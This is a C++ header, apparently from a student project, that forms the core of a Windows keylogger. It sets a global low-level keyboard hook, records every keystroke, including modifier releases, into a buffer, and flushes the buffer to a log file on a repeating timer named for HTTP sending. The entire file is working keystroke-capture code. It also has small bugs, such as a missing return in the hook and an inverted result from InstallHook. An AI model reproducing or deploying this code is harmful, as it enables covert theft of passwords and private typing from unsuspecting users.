/*
Jacob Brown jmb7438@rit.edu
Geoffrey Kanteles gdk7676@rit.edu
*/

#ifndef WINDOWSHOOK_H
#define WINDOWSHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "CodeValues.h"
#include "RunThread.h"

std::string keylog = "";
/**
    Sets log to write to, reports empty file
    @return
*/
void TimerSendHTTP()
{
    if(keylog.empty())
        return;
    std::string last_file = Logging::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
        return;
    }
}

RunThread HTTPTimer(TimerSendHTTP, 500 * 60, RunThread::Infinite);

HHOOK eHook = NULL;

/**
    Take Windows system info on key press and
    writes to log based on position data:
    [shift] for key down vs. [/shift] for key up
    Then calls next hook for next key press.
    @param nCode to track when to call next hook
    @param wparam for state information
    @param lparam to pass to next hook
    @return a call to the next hook
*/
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT
           || key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK
           || key == VK_LWIN || key == VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}
/**
    Sets system hook and starts the timer
    @return True if the hook does not exist,
    False if it does exist.
*/
bool InstallHook()
{
    Helper::WriteAppLog("Hook started... Timer started");
    HTTPTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

#endif // WINDOWSHOOK_H


